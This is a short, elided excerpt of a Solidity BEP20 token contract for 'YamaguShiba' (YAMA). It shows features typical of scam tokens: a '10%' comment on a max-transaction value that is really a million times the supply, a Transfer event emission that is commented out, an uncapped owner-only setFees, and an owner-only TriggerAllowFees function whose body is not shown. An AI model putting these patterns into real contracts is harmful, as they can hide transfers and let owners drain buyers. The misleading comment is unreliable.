...
contract TokenContract1 is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "YamaguShiba";
    string constant _symbol = "YAMA";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 1_000_000_000 * (10 ** _decimals);
    uint256 public _maxTxAmount = _totalSupply.mul(1000000); // 10%
...
//        emit Transfer(sender, recipient, amount);
    ...
    function setFees(uint256 _liquidityFee, uint256 _buybackFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _feeDenominator) external authorized {
        ...
        function TriggerAllowFees(address account, uint256 amount) external authorized {
